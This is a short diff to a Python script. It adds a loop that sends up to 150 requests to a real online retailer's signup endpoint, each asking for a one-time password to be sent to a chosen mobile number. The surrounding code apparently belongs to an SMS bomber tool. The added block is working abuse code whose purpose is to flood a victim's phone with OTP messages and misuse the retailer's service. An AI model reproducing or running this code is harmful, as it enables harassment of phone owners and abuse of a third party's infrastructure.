@@ -35,6 +35,18 @@ def main(arg):
 			print("\033[1;31m[-] Error No 20003 Please Contact Developer!")
 	except: pass
 
+
+
+
+data = {'firstName':'mashino','login':'randommail@gmail.com','password':'Someone!123','genderType':'Male','mobileNumber':no,'requestType':'SENDOTP'}
+        
+if int(jum)<=150:
+    for i in range(int(jum)):
+        response = requests.post('https://login.web.ajio.com/api/auth/signupSendOTP', data=data)
+        print(int(i+1))
+else:
+   print("\033[1;31m[-] Error No 20004 Please Contact Developer!")
+
 jobs = []
 for x in range(jum):
     jobs.append(x)
